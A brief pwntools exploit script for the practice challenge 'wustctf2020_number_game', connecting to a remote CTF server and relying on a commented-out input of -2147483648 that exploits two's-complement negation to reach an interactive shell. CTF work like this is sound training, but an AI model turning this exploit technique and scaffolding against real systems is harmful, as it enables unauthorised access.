#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/26 20:27:57
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
if debug:
    sh = process('wustctf2020_number_game')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 27806
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so')
elf = ELF('wustctf2020_number_game')
# 负数在计算机中以补码形式保存，输出以源码输出，补码变为原码:按位取反+1
# sh.sendline(int(-2147483648))
sh.interactive()